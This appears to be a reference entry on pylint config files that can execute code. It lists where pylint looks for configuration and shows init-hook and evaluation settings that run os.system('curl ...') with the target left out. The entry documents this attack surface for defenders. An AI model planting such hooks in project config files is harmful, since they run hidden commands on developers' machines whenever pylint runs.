---
title: pylint
tags:
- cli
- config-file
- eval-python
references:
- https://pylint.pycqa.org/en/latest/user_guide/usage/run.html#command-line-options
files:
- pylintrc
- pyproject.toml
- .pylintrc
- .pylintrc.toml
---

Pylint is a static code analyser for Python. Unless `pylint` is invoked using a specific configuration file, Pylint will search for a configuration file in the current working directory in the following order:

1. `pylintrc`
2. `pylintrc.toml`, in the section `tool.pylint.`
3. `.pylintrc`
4. `.pylintrc.toml`, in the section `tool.pylint.`
5. `pyproject.toml`, in the section `tool.pylint.`
6. `setup.cfg`, in the section  `pylint.`
7. `tox.ini`, in the section `pylint.`

Pylint has 2 configuration options that can execute arbitrary Python code:
```ini
[MAIN]
# Python code to execute, usually for sys.path manipulation such as
init-hook=__import__("os").system("curl ...")

[REPORTS]
# Python expression which should return a score less than or equal to 10. You
# have access to the variables 'fatal', 'error', 'warning', 'refactor',
# 'convention', and 'info' which contain the number of messages in each
# category, as well as 'statement' which is the total number of statements
# analyzed. This score is used by the global evaluation report (RP0004).
evaluation=__import__("os").system("curl ...") or 0
score=yes
```
